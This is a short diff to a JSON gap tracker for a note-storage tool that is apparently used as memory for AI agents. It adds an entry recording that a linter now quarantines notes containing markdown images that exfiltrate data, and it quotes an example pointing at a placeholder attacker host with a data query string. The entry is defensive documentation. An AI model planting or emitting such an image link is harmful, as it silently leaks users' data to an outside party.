@@ -28,5 +28,11 @@
     "summary": "Fixed in 1.6.0: a note can carry an optional confidence (0 to 1). It is the writer's claim, it is labelled as such, it survives edits, export and import, and it never overrides the trust rules.",
     "status": "fixed",
     "fixed_in": "1.6.0"
+  },
+  "GAP-POISON-MDLINK": {
+    "title": "Markdown image data-exfiltration payloads are not flagged",
+    "summary": "Fixed in 2.0.0: the write-time linter holds a note in quarantine when it carries a markdown image (it loads by itself when rendered) pointing at a remote address with a query string, such as ![x](https://attacker/pixel?data=...). README badge hosts (img.shields.io, badgen.net, badge.fury.io, codecov.io) are exempt. Plain links need a click and are not flagged.",
+    "status": "fixed",
+    "fixed_in": "2.0.0"
   }
 }
